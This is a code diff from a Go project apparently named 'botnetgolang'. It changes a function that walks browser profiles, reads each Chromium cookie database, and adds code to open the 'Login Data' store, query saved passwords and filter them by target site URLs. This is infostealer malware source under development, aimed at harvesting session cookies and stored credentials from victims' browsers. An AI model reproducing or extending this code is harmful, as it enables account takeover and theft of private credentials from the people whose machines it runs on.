@@ -1,6 +1,7 @@
 package internal
 
 import (
+	_const "botnetgolang/internal/const"
 	"botnetgolang/internal/model"
 	"botnetgolang/internal/pkg"
 	"encoding/json"
@@ -83,24 +84,30 @@ func MainBL(browser model.BrowserPaths) {
 
 	// chua lay duoc secret key
 
-	for _, value := range allProfile.Alls {
-		path := fmt.Sprintf("%v\\Network\\Cookies", value)
-		conn, err := pkg.ConnectSQLite(path)
+	for _, profile := range allProfile.Alls {
+		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
+		connToken, err := pkg.ConnectSQLite(path)
 		if err != nil {
 			fmt.Println(err)
 		}
-		fmt.Println(conn)
-		token, _ := pkg.QueryData(conn, pkg.CookiesSQL)
+		fmt.Println(connToken)
+		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
 		fmt.Println(token)
 		jsonBytes, err := json.Marshal(token)
 		jsonString := string(jsonBytes)
 		fmt.Println(jsonString)
-		isLogin := pkg.CheckLogin(token)
-		if isLogin != nil {
-			token = pkg.FilterCookieConditions(token)
-
+		//isLogin := pkg.CheckLogin(token)
+		path = fmt.Sprintf("%v\\Login Data", profile)
+		connInfo, err := pkg.ConnectSQLite(path)
+		info, _ := pkg.QueryData(connInfo, pkg.Passwords)
+		conditions := []interface{}{
+			_const.Cfff,
+			_const.Cggg,
+			_const.Clll,
 		}
 
+		listInfo := pkg.FilterConditions(info, conditions, "action_url")
+		fmt.Println(listInfo)
 	}
 
 }
